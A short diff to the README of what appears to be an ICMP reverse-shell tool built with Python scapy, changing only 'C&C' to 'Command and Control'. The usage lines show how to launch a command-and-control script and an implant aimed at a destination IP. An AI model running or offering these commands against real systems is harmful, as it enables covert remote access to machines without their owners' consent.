@@ -3,7 +3,7 @@ ICMP reverse shell with py3 scapy
 
 Usage:
 ```bash
-./icmp-cnc.py -i INTERFACE -d DESTINATION_IP (C&C)
+./icmp-cnc.py -i INTERFACE -d DESTINATION_IP (Command and Control)
 ./icmpdoor.py -i INTERFACE -d DESTINATION_IP (Implant)
 ```
 Arguments:
